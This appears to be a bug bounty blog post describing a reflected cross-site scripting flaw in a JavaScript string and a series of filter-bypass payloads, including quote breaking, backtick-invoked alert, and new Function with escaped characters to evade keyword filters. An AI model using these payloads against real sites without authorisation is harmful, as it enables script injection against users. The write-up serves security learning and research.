---
layout: post
title: An XSS Story
image: /images/default.jpg
---

Last night I stumbled across an XSS in a bug bounty program, this was quite fun to exploit.

<!--more-->

A little bit of context, the URL was as follows:

{% highlight bash%}
https://bugbounty.program/dir/page.ext?param1=SOMETHING&param2=SOMETHINGELSE
{% endhighlight %}

Going thru the page code we can clearly see a reflection in a javascript tag, around the entry "subject".

{% highlight javascript%}
xxx: {
    paramX: "SOMESTRING",
    country: "US",
    owner: "mail@program",
    subject: "SOMETHING",
    [...]
}
{% endhighlight %}

Let's try with my favorite test payload `AAAA"<i>'BBBB(1)` and see how the characters are escaped.

{% highlight javascript%}
xxx: {
    paramX: "SOMESTRING",
    country: "US",
    owner: "mail@program",
    subject: "AAAA" 'BBBB",
    [...]
}
{% endhighlight %}

The tag was stripped but the double quote isn't escaped. We can say goodbye to the infamous `</script><script>alert(1)` payload. Let's try to bypass the filter with a little bit of Javascript magic :D

In JS if we have a string we can try to add a function and it will be executed, a simple alert(1) should do the work. Our payload is now `AAAA"+alert(1)+"BBBB`

{% highlight bash%}
xxx: {
    paramX: "SOMESTRING",
    country: "US",
    owner: "mail@program",
    subject: "AAAA"+alert1+"BBBB",
    [...]
}
{% endhighlight %}

Damn, it seems that our parenthesis were removed, let's try with an alternative way to trigger an alert using the backticks : `AAAA"+alert\`1\`+"BBBB`, this trick works on Firefox and Chrome/Opera in their latest version.

{% highlight bash%}
xxx: {
    paramX: "SOMESTRING",
    country: "US",
    owner: "mail@program",
    subject: "AAAA"+alert`1`+"BBBB",
    [...]
}
{% endhighlight %}

Yay our alert(1) popped :D, let's now imagine more protections, only to do some JS magic.
We can try to `eval()` our `alert()` using the backticks and some escape characters.
What if eval and alert are banned keywords ?
We can still use the `New Function` !

{% highlight javascript%}
xxx: {
    paramX: "SOMESTRING",
    country: "US",
    owner: "mail@program",
    subject: "AAAA"+new Function`al\ert\`XSS\``+"BBBB",
    [...]
}
{% endhighlight %}

In Javascript we can escape any character and they will be treated as the original character if it doesn't exist.

{% highlight javacript%}
\a = a
\e = e
\l = l
\r = \r because it's a new line
\t = \t because it's a tab
{% endhighlight %}

That's all folks !